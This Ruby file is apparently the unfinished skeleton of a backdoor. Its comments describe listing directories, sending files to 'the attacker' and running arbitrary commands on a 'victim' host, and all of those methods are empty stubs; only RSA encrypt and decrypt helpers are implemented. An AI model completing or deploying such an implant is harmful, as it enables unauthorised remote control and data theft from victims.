#!/usr/bin/env ruby

require "openssl"

# -------------------------------------------------------------
# Dispatch
#
# Respond to an incomming command.
# -------------------------------------------------------------

class Dispatch

	def initialize()

	end

# -------------------------------------------------------------
# Commands
# -------------------------------------------------------------

	# LS
	#
	# List the contents of the current directory, or a given 
	# directory path.
	
	def ls(path)
	
	end

	# Get
	# 
	# Send a file back to the attacker on the specified port
	def get(path, port)
		
	end

	# Die
	#
	# Shut the program down.

	def die()
		
	end

	# Cmd
	#
	# Run any command and send the result to the attacker.

	def cmd(command)
		
	end

# -------------------------------------------------------------
# Encryption
#
# Asymmetric ncryption scheme for the victim host. Encrypt
# using the attackers public key, decrypt using its own 
# private key.
# -------------------------------------------------------------

	# Encrypt
	#
	# Encrypt a string using the attacker's public key and return
	# the cipher text.

	def encrypt(data)
		key = OpenSSL::PKey::RSA.new File.read '../keys/attacker.pub'
		key.public_key.public_encrypt(data)
	end

	# Dcrypt
	#
	# Decrypt cipher text using the vicitim's private key and
	# return the result. 

	def decrypt(data)
		key = OpenSSL::PKey::RSA.new File.read '../keys/victim.pem'
		key.private_decrypt(data)
	end

# -------------------------------------------------------------
# Fin
# -------------------------------------------------------------

end
